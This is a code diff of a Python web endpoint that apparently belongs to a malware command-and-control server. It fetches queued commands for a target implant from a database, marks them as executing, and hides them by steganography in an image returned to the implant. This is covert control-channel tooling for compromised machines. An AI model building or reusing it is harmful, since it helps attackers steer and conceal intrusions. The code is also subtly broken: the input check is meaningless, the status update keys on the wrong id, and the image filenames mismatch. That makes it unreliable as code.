@@ -110,19 +110,19 @@ def get_qcommands():
     if [";", "\'", "\""] in id:
         return "What", 401, {'Access-Control-Allow-Origin': config.clientURL}
     try:
-        query = sql.SQL("select task_id, target_implant_id, command from {table} where {column} = %s").format(
+        query = sql.SQL("select * from {table} where {column} = %s").format(
             table=sql.Identifier('task_queue'),
             column=sql.Identifier('target_implant_id'))
         db_resp = tools.executeSelectQueryVars(query, [id])
         print(f"this is the db response: {db_resp}")
 
-        data = {"task_id":db_resp[0], "target_implant_id":db_resp[1], "command":db_resp[2]}
-
         if db_resp == None:
             db_resp = {"commands": "No commands found"}
+        data = json.dumps(db_resp)
         query = "UPDATE task_queue SET status=%s WHERE id=%s"
         tools.executeGenericVar(query, ['executing', id])
-        SteganographyFixed.createEncodedImage("doge.png", )
+
+        SteganographyFixed.createEncodedImage("doge.png", data, "doge_ecnoded.png")
         response = send_file('doge_encoded.png', mimetype='image/png')
         return response, {'Access-Control-Allow-Origin': config.clientURL}
 
